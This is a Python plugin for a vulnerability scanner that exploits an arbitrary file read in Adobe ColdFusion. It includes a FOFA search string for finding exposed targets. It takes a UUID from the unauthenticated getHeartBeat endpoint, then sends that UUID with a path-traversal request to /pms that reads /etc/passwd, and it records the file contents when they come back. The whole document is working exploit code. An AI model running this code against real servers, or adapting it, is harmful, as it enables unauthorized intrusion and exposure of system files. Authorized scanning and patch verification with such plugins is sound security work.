#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/0uvG_SQl9eXiZKgkBRkQlw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Adobe ColdFusion任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="Adobe-ColdFusion"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/12',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Accept': '*/*',
      }
  uuid_path = '/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat'
  target = '/pms?module=logging&file_name=../../../../../../../etc/passwd&number_of_lines=100'
  uuid_url = url +uuid_path
  url1 = url + target
  ret['url'] = url1
  
  uuid = ''
  try:
    res=requests.get(url=uuid_url,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'name=.*?uuid.*?<string>.*?</string></var></struct></data></wddxPacket>',res.text,re.S):
      result = re.search(r'''<var name='uuid'><string>(?P<uuid>.*?)</string></var>''',res.text)
      uuid = result.group('uuid')
      if uuid == '':
        return ret
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    headers['uuid'] = uuid
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and (re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S) or re.search(r'nobody:.*?:[0-9]*:[0-9]*:',res.text,re.S)):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret